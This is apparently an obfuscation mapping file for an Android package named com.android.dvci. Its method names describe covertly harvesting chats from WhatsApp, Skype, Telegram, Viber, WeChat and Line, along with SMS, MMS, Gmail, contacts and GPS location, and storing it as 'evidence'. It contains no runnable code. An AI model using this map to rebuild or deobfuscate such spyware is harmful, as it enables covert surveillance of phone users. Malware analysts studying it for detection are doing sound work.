android.media.AmrInputStream -> android.media.AmrInputStream:
    313:345:java.lang.String readAccount(java.lang.String) -> field_ids_size
    355:386:void readGoogleTalkMessages(long[]) -> localvar
    389:442:long fetchGTalkMessages(com.android.dvci.db.GenericSqliteHelper,long) -> Code
    446:467:void setMyAccount(com.android.dvci.db.GenericSqliteHelper) -> myarray
    470:500:void saveContacts(com.android.dvci.db.GenericSqliteHelper) -> invoked
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.module.chat.ChatGoogle$1 -> stt.aY:
    com.android.dvci.module.chat.HangoutConversation val$conversation -> gN
    com.android.dvci.module.chat.ChatGroups val$groups -> gy
    java.util.ArrayList val$messages -> gB
    com.android.dvci.module.chat.ChatGoogle this$0 -> gO
    172:229:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatGoogle$2 -> stt.aZ:
    com.android.dvci.module.chat.ChatGroups val$groups -> gy
    java.lang.String val$thread_id -> gP
    com.android.dvci.module.chat.ChatGoogle this$0 -> gO
    255:274:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatGoogle$3 -> stt.ba:
    java.lang.String val$account -> gK
    java.util.ArrayList val$conversations$7865b31 -> gL
    com.android.dvci.module.chat.ChatGoogle this$0 -> gO
    292:302:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatGoogle$4 -> stt.bb:
    java.util.ArrayList val$messages -> gB
    com.android.dvci.module.chat.ChatGoogle this$0 -> gO
    396:435:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatGoogle$5 -> stt.bc:
    com.android.dvci.module.chat.ChatGoogle this$0 -> gO
    451:461:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatGoogle$6 -> stt.bd:
    com.android.dvci.module.chat.ChatGoogle this$0 -> gO
    478:490:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatGroups -> stt.be:
    java.util.Hashtable contacts -> gH
    java.util.Hashtable groups -> gQ
    java.util.Hashtable tos -> gR
    24:27:void addLocalToAllGroups(java.lang.String) -> field_ids_off
    30:31:void addPeerToGroup(java.lang.String,java.lang.String) -> zygotevar
    44:54:void addPeerToGroup(java.lang.String,com.android.dvci.module.chat.Contact) -> Code
    58:63:com.android.dvci.module.chat.Contact getContact(java.lang.String) -> method_ids_size
    75:107:java.lang.String getGroupTo(java.lang.String,java.lang.String,int) -> localvar
    111:111:java.lang.String getGroupToDisplayName(java.lang.String,java.lang.String) -> zygoteclass
    115:115:java.lang.String getGroupToId(java.lang.String,java.lang.String) -> mymethod
    119:119:java.lang.String getGroupToName(java.lang.String,java.lang.String) -> myclass
    124:124:boolean isGroup(java.lang.String) -> method_ids_off
    132:132:boolean hasMemoizedGroup(java.lang.String) -> class_defs_size
    136:136:java.util.Set getAllGroups() -> dn
    142:147:java.lang.String getName(java.lang.String) -> getName
com.android.dvci.module.chat.ChatLine -> stt.bf:
    java.lang.String pObserving -> eZ
    java.lang.String dbFile -> gS
    java.lang.String dbAccountFile -> gT
    java.util.concurrent.Semaphore readChatSemaphore -> gt
    long lastLine -> gU
    java.lang.String account -> fI
    java.lang.String account_mid -> gV
    com.android.dvci.db.GenericSqliteHelper helper -> gW
    38:38:int getProgramId() -> di
    43:43:java.lang.String getObservingProgram() -> dj
    48:49:void notifyStopProgram(java.lang.String) -> link_size
    54:111:void start() -> start
    117:158:java.lang.String readMyPhoneNumber$184e2efa(java.util.ArrayList) -> variables
    171:242:long readLineMessageHistory() -> do
    248:298:com.android.dvci.module.chat.ChatGroups getLineGroups(com.android.dvci.db.GenericSqliteHelper) -> zygoteapp
    21:21:java.lang.String access$000(com.android.dvci.module.chat.ChatLine) -> Code
    21:21:java.lang.String access$100(com.android.dvci.module.chat.ChatLine) -> localvar
com.android.dvci.module.chat.ChatLine$1 -> stt.bg:
    com.android.dvci.module.chat.ChatGroups val$groups -> gy
    java.util.ArrayList val$messages -> gB
    com.android.dvci.module.chat.ChatLine this$0 -> gX
    188:227:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatLine$2 -> stt.bh:
    com.android.dvci.module.chat.ChatGroups val$groups -> gy
    com.android.dvci.module.chat.ChatLine this$0 -> gX
    253:276:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatSkype -> stt.bi:
    java.lang.String pObserving -> eZ
    java.util.concurrent.Semaphore readChatSemaphore -> gt
    com.android.dvci.module.chat.ChatSkype$ChatSkypeGroups groups$7ddadd82 -> gY
    java.lang.String dbDir -> gZ
    47:47:int getProgramId() -> di
    52:52:java.lang.String getObservingProgram() -> dj
    58:64:void notifyStopProgram(java.lang.String) -> link_size
    70:77:void start() -> start
    91:160:void readSkypeMessageHistory() -> dp
    165:194:com.android.dvci.db.GenericSqliteHelper openSkypeDBHelper(java.lang.String) -> class_defs_off
    198:231:void saveSkypeContacts(com.android.dvci.db.GenericSqliteHelper) -> zygotevar
    235:259:java.util.ArrayList getSkypeConversations$2512e546(com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> localvar
    268:338:long fetchMessages(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.chat.SkypeConversation,long) -> Code
    345:358:void fetchGroup(com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> localclass
    362:386:java.lang.String readAccount() -> dq
    392:393:void saveEvidence(java.util.ArrayList) -> inst
    397:422:boolean getCurrentCall(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.call.CallInfo) -> Code
com.android.dvci.module.chat.ChatSkype$1 -> stt.bj:
    com.android.dvci.module.chat.ChatSkype this$0 -> ha
    206:221:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatSkype$2 -> stt.bk:
    java.lang.String val$account -> gK
    java.util.ArrayList val$conversations$7865b31 -> gL
    com.android.dvci.module.chat.ChatSkype this$0 -> ha
    244:254:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatSkype$3 -> stt.bl:
    com.android.dvci.module.chat.SkypeConversation val$conversation -> hb
    java.util.ArrayList val$messages -> gB
    com.android.dvci.module.chat.ChatSkype this$0 -> ha
    280:320:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatSkype$4 -> stt.bm:
    java.lang.String val$conversation -> hc
    com.android.dvci.module.chat.ChatSkype this$0 -> ha
    351:353:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatSkype$5 -> stt.bn:
    com.android.dvci.module.call.CallInfo val$callInfo -> hd
    403:416:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatSkype$ChatSkypeGroups -> stt.bi$Code:
    com.android.dvci.module.chat.ChatSkype this$0 -> ha
    430:430:boolean isGroup(java.lang.String) -> method_ids_off
com.android.dvci.module.chat.ChatTelegram -> stt.bo:
    java.lang.String pObserving -> eZ
    java.lang.String dbFile -> gS
    java.lang.String dbAccountFile -> gT
    long lastTelegram -> he
    java.util.concurrent.Semaphore readChatSemaphore -> gt
    com.android.dvci.module.chat.ChatTelegram$Account account -> hf
    boolean firstTime -> gv
    boolean started -> started
    boolean old_format_chat -> hg
    88:88:int getProgramId() -> di
    93:93:java.lang.String getObservingProgram() -> dj
    101:102:void notifyStopProgram(java.lang.String) -> link_size
    109:110:boolean frequentNotification$552c4dfd() -> dr
    118:161:void updateHistory(boolean) -> constants
    170:215:void start() -> start
    221:227:int truncatedEquals(byte[],int,byte[],int) -> localvar
    231:311:com.android.dvci.db.GenericSqliteHelper openCopy(java.lang.String) -> lua
    315:320:java.lang.String fixThreeSemicolons(java.lang.String) -> data_size
    324:345:com.android.dvci.module.chat.ChatTelegram$Account readAddressContacts(com.android.dvci.db.GenericSqliteHelper) -> zygoteclass
    384:420:com.android.dvci.module.chat.ChatTelegram$Account readMyPhoneNumber(java.lang.String) -> data_off
    433:451:long readTelegramChatHistory(com.android.dvci.db.GenericSqliteHelper,boolean) -> Code
    459:477:long readTelegramPlainChatHistory(com.android.dvci.db.GenericSqliteHelper) -> mymethod
    483:493:long readTelegramSecureChatHistory(com.android.dvci.db.GenericSqliteHelper) -> myclass
    497:522:long readTelegramGroupChatHistory(com.android.dvci.db.GenericSqliteHelper) -> myvar
    528:613:java.util.ArrayList getTelegramGroups$590cbb20(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.db.RecordHashPairVisitor,com.android.dvci.module.chat.ChatGroups) -> Code
    617:690:java.util.ArrayList getContentFromBlob(byte[]) -> lua_true
    807:825:java.lang.String readString(java.nio.ByteBuffer) -> Code
    832:838:int readInt32(java.nio.ByteBuffer) -> localvar
    858:869:boolean readBool(java.nio.ByteBuffer) -> localclass
    39:39:java.lang.String access$000$38ccfcc0(java.lang.String) -> a
    39:39:com.android.dvci.module.chat.ChatTelegram$Account access$100(com.android.dvci.module.chat.ChatTelegram) -> Code
    39:39:java.util.ArrayList access$200(com.android.dvci.module.chat.ChatTelegram,byte[]) -> Code
    39:39:boolean access$300(com.android.dvci.module.chat.ChatTelegram) -> localvar
com.android.dvci.module.chat.ChatTelegram$1 -> stt.bp:
    com.android.dvci.module.chat.ChatTelegram this$0 -> hh
    332:338:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatTelegram$3 -> stt.bq:
    java.util.ArrayList val$conversations$7865b31 -> gL
    com.android.dvci.db.RecordHashPairVisitor val$users -> hi
    com.android.dvci.module.chat.ChatGroups val$groups -> gy
    com.android.dvci.module.chat.ChatTelegram this$0 -> hh
    536:554:long cursor(android.database.Cursor) -> Code
    558:582:void unWrapParticipants(com.android.dvci.module.chat.ChatTelegram$TelegramConversation,byte[]) -> Code
    585:601:void unWrapChat(com.android.dvci.module.chat.ChatTelegram$TelegramConversation,byte[]) -> localvar
com.android.dvci.module.chat.ChatTelegram$Account -> stt.bo$Code:
    int id -> id
    java.lang.String name -> name
    java.lang.String last_name -> hj
    com.android.dvci.module.chat.ChatTelegram this$0 -> hh
    58:58:java.lang.String getName() -> getName
com.android.dvci.module.chat.ChatTelegram$MessageGroupVisitor -> stt.bo$localvar:
    java.util.ArrayList messages -> hk
    com.android.dvci.module.chat.ChatGroups groups -> bt
    com.android.dvci.db.RecordHashPairVisitor users -> hl
    com.android.dvci.module.chat.ChatTelegram this$0 -> hh
    707:750:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatTelegram$MessageRecordVisitor -> stt.bo$localclass:
    java.util.ArrayList messages -> hk
    com.android.dvci.module.chat.ChatTelegram this$0 -> hh
    763:801:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatTelegram$TelegramConversation -> stt.bo$instance:
    com.android.dvci.module.chat.ChatTelegram$Account account -> hf
    long uid -> hm
    java.lang.String name -> name
    java.util.ArrayList participants$7865b31 -> hn
    java.lang.String title -> ho
    com.android.dvci.module.chat.ChatTelegram this$0 -> hh
com.android.dvci.module.chat.ChatViber -> stt.br:
    java.lang.String pObserving -> eZ
    java.lang.String dbDir -> gZ
    java.lang.String dbChatFile -> hp
    java.lang.String dbCallFile -> hq
    java.lang.Long lastViberReadDate -> hr
    java.util.concurrent.Semaphore readChatSemaphore -> gt
    com.android.dvci.module.chat.ChatViber$ChatViberGroups groups$7ddadd82 -> hs
    java.util.Hashtable hastableConversationLastIndex -> ht
    java.lang.String account -> fI
    45:45:int getProgramId() -> di
    50:50:java.lang.String getObservingProgram() -> dj
    55:56:void notifyStopProgram(java.lang.String) -> link_size
    60:71:void start() -> start
    74:96:java.lang.String readAccount() -> dq
    111:167:void readViberMessageHistory() -> ds
    171:171:com.android.dvci.db.GenericSqliteHelper openViberDBHelperCall() -> dt
    175:175:com.android.dvci.db.GenericSqliteHelper openViberDBHelperChat() -> du
    181:205:java.util.ArrayList getViberConversations$7fa5c965(com.android.dvci.db.GenericSqliteHelper,java.lang.String,java.lang.Long) -> Code
    215:247:void fetchParticipants(com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> instance
    254:332:long fetchMessages(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.chat.ViberConversation,long) -> Code
    342:356:void updateMarkupViber$256a6c5(long) -> variables
    359:360:void saveEvidence(java.util.ArrayList) -> inst
    363:385:boolean getCurrentCall(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.call.CallInfo) -> Code
    25:25:java.lang.String access$000(com.android.dvci.module.chat.ChatViber) -> Code
com.android.dvci.module.chat.ChatViber$1 -> stt.bs:
    java.lang.String val$account -> gK
    java.util.ArrayList val$conversations$7865b31 -> gL
    com.android.dvci.module.chat.ChatViber this$0 -> hu
    190:199:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatViber$2 -> stt.bt:
    java.lang.String val$thread_id -> gP
    com.android.dvci.module.chat.ChatViber this$0 -> hu
    219:240:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatViber$3 -> stt.bu:
    com.android.dvci.module.chat.ViberConversation val$conversation -> hv
    java.util.ArrayList val$messages -> gB
    com.android.dvci.module.chat.ChatViber this$0 -> hu
    265:316:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatViber$4 -> stt.bv:
    com.android.dvci.module.call.CallInfo val$callInfo -> hd
    369:380:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatViber$ChatViberGroups -> stt.br$Code:
    com.android.dvci.module.chat.ChatViber this$0 -> hu
com.android.dvci.module.chat.ChatWeChat -> stt.bw:
    java.lang.String DEFAULT_LOCAL_NUMBER -> hw
    java.lang.String pObserving -> eZ
    java.lang.String myId -> hx
    java.lang.String myName -> hy
    java.lang.String myPhone -> ed
    java.util.concurrent.Semaphore readChatSemaphore -> gt
    java.lang.Long lastLine -> hz
    42:42:int getProgramId() -> di
    47:47:java.lang.String getObservingProgram() -> dj
    56:58:void notifyStopProgram(java.lang.String) -> link_size
    71:73:void start() -> start
    92:202:void readChatWeChatMessages() -> dv
    210:272:long fetchMessages(com.android.dvci.db.GenericSqliteHelper,com.android.dvci.module.chat.ChatGroups,long) -> Code
    276:306:void saveWechatContacts(com.android.dvci.db.GenericSqliteHelper) -> sort
    309:334:void setMyAccount(com.android.dvci.db.GenericSqliteHelper) -> myarray
    338:366:com.android.dvci.module.chat.ChatGroups getChatGroups(com.android.dvci.db.GenericSqliteHelper) -> quicksort
com.android.dvci.module.chat.ChatWeChat$1 -> stt.bx:
    com.android.dvci.module.chat.ChatGroups val$groups -> gy
    java.util.ArrayList val$messages -> gB
    com.android.dvci.module.chat.ChatWeChat this$0 -> hA
    217:265:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWeChat$2 -> stt.by:
    com.android.dvci.module.chat.ChatWeChat this$0 -> hA
    284:296:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWeChat$3 -> stt.bz:
    com.android.dvci.module.chat.ChatWeChat this$0 -> hA
    313:321:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWeChat$4 -> stt.bA:
    com.android.dvci.module.chat.ChatGroups val$groups -> gy
    com.android.dvci.module.chat.ChatWeChat this$0 -> hA
    343:359:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWhatsapp -> stt.bB:
    com.android.dvci.module.chat.ChatWhatsapp$ChatWhatsappGroups groups$7ddadd82 -> hB
    java.lang.String pObserving -> eZ
    java.lang.String myPhoneNumber -> hC
    java.util.concurrent.Semaphore readChatSemaphore -> gt
    byte[] $ -> lua_repeat
    45:45:int getProgramId() -> di
    50:50:java.lang.String getObservingProgram() -> dj
    60:66:void notifyStopProgram(java.lang.String) -> link_size
    80:100:void start() -> start
    103:155:java.lang.String readMyPhoneNumber() -> dw
    173:248:void readChatWhatsappMessages() -> dx
    261:282:void fetchGroup(com.android.dvci.db.GenericSqliteHelper,java.lang.String) -> localclass
    295:326:java.util.ArrayList fetchConversation(android.database.sqlite.SQLiteDatabase,long) -> Code
    341:414:long fetchMessages(android.database.sqlite.SQLiteDatabase,java.lang.String,long) -> Code
    418:422:java.lang.String clean(java.lang.String) -> b
    30:30:java.lang.String access$000$4a088f11(java.lang.String) -> c
    java.lang.String $$24d420ae() -> proto_ids
com.android.dvci.module.chat.ChatWhatsapp$1 -> stt.bC:
    java.lang.String val$conversation -> hc
    com.android.dvci.module.chat.ChatWhatsapp this$0 -> hD
    271:276:long cursor(android.database.Cursor) -> Code
com.android.dvci.module.chat.ChatWhatsapp$ChatWhatsappGroups -> stt.bB$Code:
    com.android.dvci.module.chat.ChatWhatsapp this$0 -> hD
    428:428:boolean isGroup(java.lang.String) -> method_ids_off
com.android.dvci.module.chat.Contact -> stt.bD:
    java.lang.String id -> hE
    java.lang.String number -> variables
    java.lang.String name -> name
    java.lang.String extra -> hF
    32:32:java.lang.String toString() -> toString
    38:40:long getId() -> getId
com.android.dvci.module.chat.FbConversation -> stt.bE:
    java.lang.String account -> fI
    java.lang.String id -> hE
    com.android.dvci.module.chat.Contact[] contacts -> hG
    long timestamp -> timestamp
    11:17:java.lang.String getTo(java.lang.String) -> d
    21:27:java.lang.String getDisplayTo(java.lang.String) -> e
com.android.dvci.module.chat.HangoutConversation -> stt.bF:
    java.lang.String account -> fI
    java.lang.String id -> hE
    long date -> hH
    boolean group -> hI
    java.lang.String remote -> hJ
    12:12:boolean isGroup() -> dy
com.android.dvci.module.chat.MessageChat -> stt.bG:
    java.lang.String body -> hK
    java.util.Date timestamp -> cr
    boolean incoming -> mylist
    int programId -> fL
    java.lang.String from -> hL
    java.lang.String to -> hM
    java.lang.String displayFrom -> hN
    java.lang.String displayTo -> hO
com.android.dvci.module.chat.SkypeConversation -> stt.bH:
    long lastReadIndex -> hP
    java.lang.String account -> fI
    int id -> id
    java.lang.String remote -> hJ
    java.lang.String displayname -> hQ
    java.lang.String given -> hR
    long timestamp -> timestamp
com.android.dvci.module.chat.SubModuleChat -> stt.bI:
    java.util.concurrent.ScheduledFuture future -> dH
    com.android.dvci.RunningProcesses runningProcesses -> es
    32:32:void start() -> start
    41:42:void startListen() -> cX
    46:47:void stopListen() -> cY
    54:61:int notification(com.android.dvci.Standby) -> Code
    67:89:int notification(com.android.dvci.ProcessInfo) -> Code
    93:93:com.android.dvci.module.chat.SubModuleChat$1 getFrequentRunnable$501bdd35(java.lang.String) -> f
    113:113:boolean frequentNotification$552c4dfd() -> dr
    117:117:com.android.dvci.module.ModuleChat getModule() -> dz
    void notifyStopProgram(java.lang.String) -> link_size
    int getProgramId() -> di
    java.lang.String getObservingProgram() -> dj
    18:18:int notification(java.lang.Object) -> Code
com.android.dvci.module.chat.SubModuleChat$1 -> stt.bJ:
    java.lang.String val$processInfo -> hS
    com.android.dvci.module.chat.SubModuleChat this$0 -> hT
    100:108:void run() -> run
com.android.dvci.module.chat.ViberConversation -> stt.bK:
    java.lang.String account -> fI
    long id -> id
    long date -> hH
    java.lang.String remote -> hJ
    boolean group -> hI
    12:12:boolean isGroup() -> dy
com.android.dvci.module.email.Email -> stt.bL:
    java.util.Date timestamp -> cr
    java.lang.String fromAddress -> hU
    java.lang.String toAddresses -> hV
    java.lang.String ccAddresses -> hW
    java.lang.String body -> hK
    java.lang.String snippet -> hX
    java.lang.String subject -> hY
    boolean incoming -> mylist
    32:86:java.lang.String makeMimeMessage$47921032() -> dA
    90:90:boolean isMultipart() -> dB
    94:94:java.util.Date getReceivedDate() -> dC
    98:98:boolean isIncoming() -> eval
    102:102:long getDate() -> getDate
com.android.dvci.module.email.GmailVisitor -> stt.bM:
    boolean initialized -> aa
    com.android.dvci.module.ModuleMessage moduleMessage -> hZ
    java.lang.String mailstore -> ia
    java.lang.String[] projection -> projection
    java.lang.String selection -> selection
    int lastId -> ib
    java.lang.String from -> hL
    com.android.dvci.module.message.Filter filter -> ic
    44:61:java.lang.String decompress(byte[]) -> lua_until
    67:105:long cursor(android.database.Cursor) -> Code
    109:113:void initialize$7b4aafc2() -> dD
    117:117:java.lang.String[] getProjection() -> getProjection
    122:126:java.lang.String getSelection() -> getSelection
    131:131:boolean isStopRequested() -> S
com.android.dvci.module.message.Filter -> stt.bN:
    boolean enabled -> enabled
    boolean doFilterFromDate -> ie
    java.util.Date fromDate -> if
    boolean doFilterToDate -> ig
    java.util.Date toDate -> ih
    int maxMessageSize -> ii
    int maxMessageSizeToLog -> ij
    java.util.Vector keywords -> ik
    85:108:int filterMessage$4876ee43$2566aa8(long) -> mylist
    121:140:boolean equals(java.lang.Object) -> equals
    144:157:int hashCode() -> hashCode
    162:195:java.lang.String toString() -> toString
com.android.dvci.module.message.Mms -> stt.bO:
    boolean SENT -> il
    java.lang.String address -> im
    java.lang.String subject -> hY
    java.lang.String body -> hK
    long date -> hH
    boolean sent -> in
    int id -> id
    67:67:java.lang.String getAddress() -> getAddress
    75:75:java.lang.String getSubject() -> getSubject
    87:87:long getDate() -> getDate
    91:91:boolean getSent() -> dE
    111:111:int getId() -> getId
    115:115:boolean isValid() -> isValid
    119:119:java.lang.String getBody() -> getBody
com.android.dvci.module.message.MmsBrowser -> stt.bP:
    java.util.ArrayList list -> io
    int maxId -> ip
    39:48:java.util.ArrayList getMmsList(int) -> lua_break
    55:117:void parse(java.lang.String,boolean,int) -> Code
    122:141:java.lang.String extractNumber(java.lang.String,java.lang.String[],java.lang.String) -> Code
    148:169:java.lang.String extractBody(java.lang.String) -> g
    183:206:java.lang.String getMmsText(java.lang.String) -> h
    210:226:java.lang.String getAddressNumber(java.lang.String) -> i
    230:230:int getMaxId() -> dF
com.android.dvci.module.message.MsgHandler -> stt.bQ:
    com.android.dvci.module.message.MsgHandler$1 handler$2ace4d50 -> iq
    com.android.dvci.module.message.MsgObserver msgObserver$18a11b74 -> ir
    boolean smsEnabled -> eK
    boolean mmsEnabled -> eL
    38:70:void run() -> run
    73:76:void quit() -> quit
com.android.dvci.module.message.MsgHandler$1 -> stt.bR:
    com.android.dvci.module.message.MsgHandler this$0 -> is
    47:47:void handleMessage(android.os.Message) -> handleMessage
com.android.dvci.module.message.MsgObserver -> stt.bS:
    boolean mmsEnabled -> eL
    boolean smsEnabled -> eK
    long changeDelay -> it
    android.os.Handler h -> iu
    42:51:void onChange(boolean) -> onChange
    61:62:void run() -> run
    69:122:void actualBrowsing() -> dG
com.android.dvci.module.message.MsgObserver$1 -> stt.bT:
    com.android.dvci.module.message.MsgObserver this$0 -> iv
    35:36:boolean handleMessage(android.os.Message) -> handleMessage
com.android.dvci.module.message.Sms -> stt.bU:
    java.lang.String address -> im
    java.lang.String body -> hK
    long date -> hH
    boolean sent -> in
    java.lang.String read -> iw
    java.lang.String protocol -> protocol
    java.lang.String thread_id -> ix
    java.lang.String status -> iy
    java.lang.String type -> type
    java.lang.String reply_path -> iz
    int id -> id
    95:95:java.lang.String getAddress() -> getAddress
    107:107:java.lang.String getBody() -> getBody
    123:123:long getDate() -> getDate
    127:127:boolean getSent() -> dE
    143:144:void setThreadId(java.lang.String) -> j
    151:152:void setProtocol(java.lang.String) -> k
    159:160:void setRead(java.lang.String) -> l
    167:168:void setStatus(java.lang.String) -> m
    175:176:void setType(java.lang.String) -> n
    183:184:void setReplyPath(java.lang.String) -> o
    204:204:boolean isValid() -> isValid
com.android.dvci.module.message.SmsBrowser -> stt.bV:
    java.util.ArrayList list -> io
    int id -> id
    int maxId -> ip
    37:44:java.util.ArrayList getSmsList(int) -> lua_do
    52:208:int parse(java.lang.String,int) -> instance
    212:224:void printColumnsSms(android.database.Cursor) -> localvar
    231:231:int getMaxId() -> dF
com.android.dvci.module.position.GPSLocationListener -> stt.bW:
    void onLocationChanged(android.location.Location) -> onLocationChanged
com.android.dvci.module.position.GPSLocator -> stt.bX:
    android.location.LocationManager lm -> iA
    android.location.LocationListener listener -> iB
    java.lang.String provider -> iC
    android.os.Looper myLooper -> iD
    byte[] $ -> lua_repeat
    int $$ -> dl
    void initLocationUpdates() -> dH
    49:54:void run() -> run
    61:62:void setListener(android.location.LocationListener) -> Code
    65:65:android.location.Location getLastKnownPosition() -> dI
    69:78:void halt() -> bb
    84:94:void turnGPSOn() -> dJ
    100:110:void turnGPSOff() -> dK
    116:137:boolean canToggleGPS() -> dL
    141:145:boolean isGPSEnabled() -> dM
    java.lang.String $(int,int,int) -> localvar
com.android.dvci.module.position.GPSLocatorAuto -> stt.bY:
    com.android.dvci.module.position.GPSLocatorAuto instance -> iE
    java.util.ArrayList listeners$7865b31 -> iF
    com.android.dvci.module.position.GPSLocatorPeriod locator -> iG
    long stopDelay -> iH
    boolean gotValidPosition -> iI
    boolean turnedOn -> iJ
    37:49:com.android.dvci.module.position.GPSLocatorAuto self() -> dN
    63:116:boolean start(com.android.dvci.module.position.GPSLocationListener) -> Code
    123:130:void unregister$2443f7a3(com.android.dvci.action.SmsAction) -> Code
    135:162:void stop() -> stop
    171:179:void run() -> run
    189:201:void onLocationChanged(android.location.Location) -> onLocationChanged
    208:208:void onProviderDisabled(java.lang.String) -> onProviderDisabled
    214:214:void onProviderEnabled(java.lang.String) -> onProviderEnabled
    220:220:void onStatusChanged(java.lang.String,int,android.os.Bundle) -> onStatusChanged
com.android.dvci.module.position.GPSLocatorDistance -> stt.bZ:
    float latitude -> iK
    float longitude -> iL
    float distance -> iM
    com.android.dvci.event.EventLocation rangeObserver$2c18d9f8$1094ee4d -> iN
    android.location.Location location -> iO
    boolean entered -> bP
    45:46:void initLocationUpdates() -> dH
    49:81:void onLocationChanged(android.location.Location) -> onLocationChanged
    88:88:void onProviderDisabled(java.lang.String) -> onProviderDisabled
    94:94:void onProviderEnabled(java.lang.String) -> onProviderEnabled
    100:100:void onStatusChanged(java.lang.String,int,android.os.Bundle) -> onStatusChanged
com.android.dvci.module.position.GPSLocatorPeriod -> stt.ca:
    int period -> dp
    27:28:void initLocationUpdates() -> dH
com.android.dvci.module.task.Contact -> stt.cb:
    com.android.dvci.module.task.UserInfo userInfo -> iP
    java.util.ArrayList emailInfo$7865b31 -> iQ
    java.util.ArrayList paInfo$7865b31 -> iR
    java.util.ArrayList phoneInfo$7865b31 -> iS
    java.util.ArrayList imInfo$7865b31 -> iT
    java.util.ArrayList orgInfo$7865b31 -> iU
    java.util.ArrayList webInfo$7865b31 -> iV
    40:41:void add(com.android.dvci.module.task.EmailInfo) -> Code
    44:45:void add(com.android.dvci.module.task.PostalAddressInfo) -> Code
    48:49:void add(com.android.dvci.module.task.PhoneInfo) -> Code
    52:53:void add(com.android.dvci.module.task.ImInfo) -> Code
    56:57:void add(com.android.dvci.module.task.OrganizationInfo) -> Code
    60:61:void add(com.android.dvci.module.task.WebsiteInfo) -> Code
    64:64:com.android.dvci.module.task.UserInfo getUserInfo() -> dO
    76:76:java.util.ArrayList getPhoneInfo$5679c1ce() -> dP
    93:101:java.lang.String toString() -> toString
    105:173:java.lang.String getInfo() -> getInfo
    177:177:long getId() -> getId
com.android.dvci.module.task.EmailInfo -> stt.cc:
    long userId -> iW
    int emailType -> iX
    java.lang.String email -> iY
    30:30:int getEmailType() -> dQ
    34:34:java.lang.String getEmail() -> dR
com.android.dvci.module.task.ImInfo -> stt.cd:
    long userId -> iW
    int imType -> iZ
    java.lang.String im -> ja
    30:30:int getImType() -> dS
    34:34:java.lang.String getIm() -> dT
com.android.dvci.module.task.OrganizationInfo -> stt.ce:
    int userId -> jb
    int type -> type
    java.lang.String companyName -> jc
    java.lang.String companyTitle -> jd
    32:32:int getType() -> getType
    36:36:java.lang.String getCompanyName() -> dU
    40:40:java.lang.String getCompanyTitle() -> dV
com.android.dvci.module.task.PhoneInfo -> stt.cf:
    long userId -> iW
    int phoneType -> je
    java.lang.String phoneNumber -> jf
    30:30:int getPhoneType() -> getPhoneType
    34:34:java.lang.String getPhoneNumber() -> lua_not
com.android.dvci.module.task.PickContact -> stt.cg:
    byte[] $ -> lua_repeat
